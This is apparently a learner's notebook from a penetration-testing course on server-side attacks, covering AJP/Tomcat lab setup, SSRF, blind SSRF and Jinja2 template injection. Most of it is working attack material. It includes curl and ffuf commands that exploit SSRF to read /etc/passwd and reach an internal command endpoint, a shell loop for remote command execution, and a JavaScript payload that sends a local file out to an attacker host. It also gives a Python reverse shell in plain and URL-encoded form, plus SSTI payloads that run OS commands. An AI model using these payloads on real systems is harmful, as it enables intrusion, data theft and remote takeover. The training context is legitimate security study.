# Server side attacks

Intro - bunch of stuff on diferent server side attacks based on binary protocol or other

## Abusing Intermediary Applications - AJP / Tomcat
Port `8009`

To replicate a vulnerable environment, first create a file of `tomcat-users.xml`
```xml
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```

Then spawn:
```bash
sudo apt install docker.io
sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
```


Second part of replicating the steps was easy once running on your own kali box from `https://www.kali.org/get-kali/#kali-virtual-machines`. With the following changes:
1. 8Gb RAM, 4 Cores, Bridged network adapter. 
2. (In vm when running) Apple macintosh laptop keyboard layout & UK Lang setting


Third part was steps on how to do the same with apache (& stop the previous nginx server)


## Server-Side Request Forgery (SSRF)



### Exploitation example
1. Uses nmap on the target with flags `-sT -T5 --min-rate=10000 -p-` which gives 3 ports. 
2. Use curl with `-i -s` to see a resp. Then again with the `-L` to follow the redirect (shows the second HTTP response).
3. New tab listening on port 8080 with `-nvlp` and get our IP to supply in next req:
4. `curl -i -s http://$TAREGT_IP/load?q=http://$TUN_ID:8080` missed the http:// in the go. The user agent is Python-urllib/3.8 
5. Created file index.html and started a HTTP server with `python3 -m http.server 9090`
6. In new tab started a FTP server with:
	```bash
	sudo pip3 install twisted
	sudo python3 -m twisted ftp -p 21 -r .
	```
7. ran `curl -i -s -L http://$TARGET_IP/load?q=ftp://$TUN_ID/index.html` and got the contents.
8. ran `curl -i -s -L http://$TARGET_IP/load?q=http://$TUN_ID:9090/index.html` and got the contents
9. ran `curl -i -s -L http://$TARGET_IP/load?q=file:///etc/passwd` and got same
10. Make a wordlist of ports:
	```bash
	for port in {1..65535};do echo $port >> ports.txt;done
	```
11. fuzz with fuff `ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30` got ports `80` and `5000`. cURL'd the 5000 one. filters on response size 30

Now lesson is trying to attack `internal.app.local`, as it was seen when we did the very first cURL on step 2. Ultimate goal to achieve RCE.

12. `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"` is then repeating on the target. Showed a 200 for Werkzeug python server. 
13. `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1` the respone of *unknown url type http127.0.0.1* shows that the *://* is getting stripped off. 
14. Repeat using http:://// instead of :// which removed the first instance. 
15. fuff again with `ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'` -fr is for regexp. again gives 80 & 5000.
16. `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:5000` shows some file content like the command `ls -alt` in terminal. 
17. From here the /proc/self/environ file is read to see the current path (which was found at PWD=/app) and then look at the file internal_local.py. **Weirdly -o not needed on the second one?**
18. Looking at source code shows `/runme?x=<CMD>` and `/` does command `ls -lha`
19. `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"`. But trying one with arguments does not work. URL encoding needed. 
20. To encode something using command line:
	```bash
	echo "encode me" | jq -sRr @uri
	```
21. Automate executing commands by putting into terminal:
	```bash
	function rce() {
	function> while true; do
	function while> echo -n "# "; read cmd
	function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
	function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
	function while> echo ""
	function while> done
	function> }
	```
	(why 3 times jq?)
22. run `rce` in term and then type in commands as you wish, response is wrapped in html.

| Exercise for the reader: Obtain a fully interactive reverse-shell
I would do this by `python -c 'import pty; pty.spwawn("/bin/bash")'`? Nope doesn't seem to work.


### Blind SSRF
Harder to detect, as it could or could not be processed on the backend. No idea. Burp collaborator on proffessional works, or http://pingb.in

Excercise is like the previous one where you follow along

1. Trying a html file with the contents:
	```html
	<!DOCTYPE html>
	<html>
	<body>
		<a>Hello World!</a>
		<img src="http://pingb.in/p/3b42ce6e7de4f57847d07dd4b2eb/x?=viaimgtag">
	</body>
	</html>
	```
	Did not seem to show up.

2. Netcat listening `sudo nc -nlvp 9090` and then saw an incoming GET. Now do again with a new HTML:
	```html
	<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
	</html>
	```
	with the same netcat listener. Data sent is then in base64 which can be decoded with an `echo "<data>" " base64 -d`
3. Getting a reverse shell. When RCE is established, have the payload:
	```bash
	export RHOST="10.";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
	```
	URL encoded:
	export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527

	This was had to be done by typing out the python, then putting through two rounds of url encoding (why??) on cyberchef in the pwnbox. Worked, and used a similar reverse shell to the idea I had!





## SSTI Example 3

Installing a python2 venv for tplmap
```bash
pip install --upgrade setuptools
pip install virtualenv
git clone https;//github.com/epinna/tplmap.git
cd ./tplmap/
virtualenv -p /path/to/python2 <name-of-venv>
source ./<name-of-venv>/bin/activate
pip install -r requirements.txt
```
Some sort of windows thingy where the command is in the param `?cmd=somet`

Now pointing to this [blog on python class heirarchy](https://www.fatalerrors.org/a/0dhx1Dk.html)

Built the following function which I think you can modify in order to obtain a subclass:
```python
s = 'HTB' # any string will do
# Prints out the index in the list for the class type you wish
def searchfunc(name):
     x = s.__class__.mro()[1].__subclasses__()
     for i in range(len(x)):
             fn = x[i].__name__
             if fn.find(name) > -1:
                     print(i, fn)

searchfunc('warning') # prints out 140 warning in the VM
```
We are looking for class warning as it imports the sys module, from sys os can be reached. 

To then gain remote execution from our index:
```python
x[140]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
```
(they missed the x in the guide)

Now running:
```bash
curl -gs "http://94.237.51.159:30981/execute?cmd={{''.__class__}}"
curl -gs "http://94.237.51.159:30981/execute?cmd={{''.__class__.__mro__}}"
curl -gs "http://94.237.51.159:30981/execute?cmd={{''.__class__.__mro__[1]}}"
curl -gs "http://94.237.51.159:30981/execute?cmd={{''.__class__.__mro__[1].__subclasses__()}}"
```

Now try the following when URL encoded:
```python
{% for i in range(450) %} 
{{ i }}
{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
{% endfor %}
```
My `catch_warnings` is at 214. Running the RCE:
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
```
cURL:
```bash
curl -gs "http://94.237.51.159:30981/execute?cmd={{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system('touch /tmp/test1') }}
"
```
Have to run URL encoded:
```bash
curl -gs "http://94.237.51.159:30981/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"
```
encoding with one comand:
```bash
 curl --get -gs --data-urlencode "cmd={{lipsum.__globals__.os.popen('id').read()}}" "http://94.237.51.159:30981/execute"
```




